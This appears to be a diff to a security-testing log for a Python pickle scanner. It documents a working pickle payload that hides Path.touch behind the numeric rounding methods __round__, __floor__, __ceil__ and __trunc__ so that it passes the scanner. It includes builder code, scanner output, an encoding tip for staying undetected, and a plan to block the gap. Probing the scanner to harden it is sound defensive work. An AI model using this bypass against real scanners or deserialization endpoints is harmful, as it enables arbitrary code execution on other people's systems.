@@ -5223,3 +5223,135 @@ Blocking plan:
 
 Performance note: five literals in the existing magic-method matcher, no
 iteration protocol flow modeling or broad builtin blocklist additions.
+
+## Turn 101 - Numeric rounding protocol method family gap
+
+Candidate payload:
+
+- Create a runtime subclass with `builtins.type`.
+- Use `pathlib.PosixPath` as the base class so instances are valid filesystem
+  paths.
+- Install `pathlib.Path.touch` as a numeric rounding protocol method, for
+  example `__round__`.
+- Instantiate the class with a marker path.
+- Call the matching clean helper, for example `builtins.round(instance)`,
+  during unpickling.
+
+Representative protocol 4 payload builder:
+
+```python
+from pathlib import Path
+
+
+def text(value: str) -> bytes:
+    data = value.encode()
+    if len(data) <= 0xFF:
+        return b"\x8c" + bytes([len(data)]) + data
+    return b"X" + len(data).to_bytes(4, "little") + data
+
+
+def sg(module: bytes, name: bytes) -> bytes:
+    return text(module.decode()) + text(name.decode()) + b"\x93"
+
+
+marker = Path("/tmp/ma_numeric_round_round_marker")
+payload = b"".join(
+    [
+        b"\x80\x04",
+        sg(b"builtins", b"type"),
+        b"(",
+        text("DerivedPath"),
+        sg(b"pathlib", b"PosixPath"),
+        b"\x85",
+        b"}",
+        text("__round__"),
+        sg(b"pathlib", b"Path.touch"),
+        b"s",
+        b"tR\x940",
+        b"h\x00",
+        text(str(marker)),
+        b"\x85R\x940",
+        sg(b"builtins", b"round"),
+        b"h\x01\x85R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12 for the `__round__` representative:
+
+- Control scanner result: `len=139`, `status=complete`, `verdict=clean`,
+  `is_clean=True`, `findings=[]`, `notices=[]`
+- RCE scanner result: `len=159`, `status=complete`, `verdict=clean`,
+  `is_clean=True`, `findings=[]`, `notices=[]`
+- Coverage for the RCE payload: `bytes_scanned=159`, `bytes_total=159`,
+  `opcode_count=33`, `raw_scan_complete=True`, `opcode_scan_complete=True`
+- Scanner import references: `builtins.type`, `pathlib.PosixPath`,
+  `pathlib.Path.touch`, and `builtins.round`, all with
+  `is_dangerous=False`
+- Control proof: the same pickle without the final `round` call returns a
+  `DerivedPath` instance at `/tmp/ma_numeric_round_round_marker` and does not
+  create the marker
+- Unpickle result: the full payload returns `None` and creates
+  `/tmp/ma_numeric_round_round_marker` with mode `0o644`
+
+Sibling slot proof:
+
+| Helper | Method | Scanner verdict | Runtime result |
+| --- | --- | --- | --- |
+| `builtins.round` | `__round__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `math.floor` | `__floor__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `math.ceil` | `__ceil__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `math.trunc` | `__trunc__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+
+RCE mechanism:
+
+- `type(...)` builds a `pathlib.PosixPath` subclass with an
+  attacker-controlled numeric rounding hook such as
+  `__round__ = pathlib.Path.touch`.
+- The payload instantiates that subclass for the marker path.
+- `builtins.round(instance)` dispatches to `instance.__round__()`.
+- Because `__round__` points at `Path.touch`, CPython calls
+  `Path.touch(instance)`, creating the marker path. The rounding helpers in
+  this proof return the hook result directly, so `None` becomes the pickle load
+  result after the side effect.
+
+Why the scanner missed it:
+
+- Numeric rounding protocol dunder slots `__round__`, `__floor__`, `__ceil__`,
+  and `__trunc__` are absent from the suspicious magic-method string list.
+- The corresponding helpers `builtins.round`, `math.floor`, `math.ceil`, and
+  `math.trunc` are absent from `DANGEROUS_GLOBALS`.
+- `builtins.type` and `pathlib.Path.touch` are clean; `pathlib` and `math` are
+  not wildcard-dangerous modules.
+- The dangerous callable is hidden as a synthesized numeric protocol method,
+  so the final visible call target is a common numeric helper rather than the
+  attacker-selected callable.
+- Use `SHORT_BINUNICODE`/`BINUNICODE` operands for these method-name strings.
+  Encoding `__floor__` as a legacy `SHORT_BINSTRING` can trigger an unrelated
+  nested-raw-pickle heuristic, but the unicode pickle form scans clean.
+
+Performance note: the focused next block should add `__round__`, `__floor__`,
+`__ceil__`, and `__trunc__` to the suspicious magic-method string list. That
+costs four literals in the existing matcher and avoids broad `builtins.round`
+or `math` helper blocklist entries.
+
+## Turn 102 - Block numeric rounding protocol seeds
+
+Blocking plan:
+
+- Add `__round__`, `__floor__`, `__ceil__`, and `__trunc__` to the existing
+  suspicious magic-method string list. These hooks can route execution through
+  common numeric helpers without exposing the attacker-selected callable as the
+  final call target.
+- Leave `builtins.round`, `math.floor`, `math.ceil`, and `math.trunc` allowed
+  for this focused block. The static signal is the attacker-controlled numeric
+  protocol slot name, which avoids broad false positives on common benign
+  numeric helper calls.
+- Add a CPython oracle regression for all four Turn 101 slots. The regression
+  verifies construction-only controls are suspicious and side-effect free,
+  then verifies each active helper dispatch is suspicious and creates its
+  marker during `pickle.loads()` while returning `None`.
+- Add a changelog entry under `[Unreleased]`.
+
+Performance note: four literals in the existing magic-method matcher, no
+numeric helper flow modeling or broad `math` blocklist additions.
